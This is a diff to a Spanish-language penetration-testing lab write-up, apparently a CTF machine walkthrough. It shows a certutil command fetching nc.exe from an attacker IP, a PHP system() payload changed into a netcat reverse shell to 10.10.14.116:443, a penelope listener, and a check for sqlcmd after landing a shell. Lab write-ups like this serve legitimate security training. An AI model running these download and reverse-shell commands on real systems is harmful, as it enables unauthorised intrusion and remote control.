@@ -324,7 +324,7 @@ system("certutil.exe -f -urlcache -split http://10.10.14.116/nc.exe C:\\Windows\
 
 Despues deberemos de modificar el archivo y añadirle el siguiente contenido
 ```php
-system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
+system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.116 443");
 ```
 
 Nos pondremos en escucha ahora con [[PENELOPE]] y enviaremos la reverse shell
@@ -334,7 +334,12 @@ penelope -p 443
 
 Obteniendo una shell como yoshihide
 Vamos a intentar conectarnos hora que estamos dentro a la base de datos anteriormente identificada
+Identificamos si existe `sqlcmd` para poder acceder a la base de datos
+```shell
+sqlcmd -?
+```
 
+Viendo que si que lo tiene
 
 
 
